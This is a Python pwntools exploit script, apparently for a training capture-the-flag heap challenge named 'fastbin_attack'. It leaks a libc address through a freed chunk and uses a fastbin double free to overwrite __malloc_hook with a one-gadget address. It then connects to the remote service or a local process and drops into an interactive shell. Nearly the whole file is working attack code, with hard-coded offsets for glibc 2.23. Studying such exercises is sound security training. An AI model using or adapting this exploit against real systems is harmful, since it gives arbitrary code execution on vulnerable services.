from pwn import *
import re

libc = ELF("libc-2.23.so")
context.terminal = ['tmux', 'splitw', '-h']

if len(sys.argv) == 2 and sys.argv[1] == 'attack':
        r = remote('bin.training.jinblack.it', 10101)
else:
    r = process('./fastbin_attack')
    gdb.attach(r, '''
        #b *0x004011bb
    ''')

DELTA_HOOK = 0x23
MAGIC = 0xf1247

input('wait')

def alloc(size):
    r.recvuntil(b"> ")
    r.sendline(b"1")
    r.recvuntil(b"Size: ")
    r.sendline(b"%d" % size)
    indexline = r.recvuntil(b"!")
    m = re.match(b"Allocated at index (\d+)!", indexline)
    return int(m.group(1))

def write_chunk(index, content):
    r.recvuntil(b"> ")
    r.sendline(b"2")
    r.recvuntil(b"Index: ")
    r.sendline(b"%d" % index)
    r.recvuntil(b"Content: ")
    r.send(content)

def read_chunk(index):
    r.recvuntil(b"> ")
    r.sendline(b"3")
    r.recvuntil(b"Index: ")
    r.sendline(b"%d" % index)
    data = r.recvuntil(b"Options:\n")
    return data[:-len(b"Options:\n")]  

def free_chunk(index):
    r.recvuntil(b"> ")
    r.sendline(b"4")
    r.recvuntil(b"Index: ")
    r.sendline(b"%d" % index)   

chunk_a = alloc(0x200) 
chunk_b = alloc(0x30)
free_chunk(chunk_a)
libc_leak = u64(read_chunk(chunk_a)[:6]+b"\x00\x00")
libc_base = libc_leak - 0x3c4b78 #differece between leak and libc_base (from gdb)
libc.address = libc_base
free_hook = libc.symbols["__free_hook"]
malloc_hook = libc.symbols["__malloc_hook"]

target = malloc_hook - 0x23

print("[!] libc_leak: %#x" % libc_leak)
print("[!] libc_base: %#x" % libc_base)
print("[!] free_hook: %#x" % free_hook)
print("[!] malloc_hook: %#x" % malloc_hook)
print("[!] target: %#x" % target)

SIZE = 0x60

chunk_1 = alloc(SIZE)
chunk_2 = alloc(SIZE)

free_chunk(chunk_1)
free_chunk(chunk_2)
free_chunk(chunk_1)

chunk_A = alloc(SIZE)
write_chunk(chunk_A, p64(target))

chunk_B = alloc(SIZE)
chunk_C = alloc(SIZE)
chunk_D = alloc(SIZE)
payload = b"A" * (DELTA_HOOK -0x10)
payload += p64(libc_base + MAGIC)
write_chunk(chunk_D , payload)

r.interactive()
